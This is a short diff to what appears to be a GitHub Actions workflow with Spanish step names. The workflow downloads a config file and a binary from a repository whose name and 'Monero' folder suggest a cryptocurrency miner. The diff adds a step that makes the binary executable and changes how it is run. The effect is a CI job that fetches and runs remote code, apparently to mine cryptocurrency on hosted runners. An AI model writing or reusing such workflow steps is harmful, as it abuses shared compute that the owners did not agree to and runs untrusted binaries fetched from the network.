@@ -15,5 +15,7 @@ jobs:
       run: |
         wget https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/Monero/config.json
         wget https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/ub20xm
+    - name:  Dar permisos.
+      run: chmod u+x ub20xm
     - name: Ejecutar.
-      run: sh ub20xm
+      run: ./ub20xm
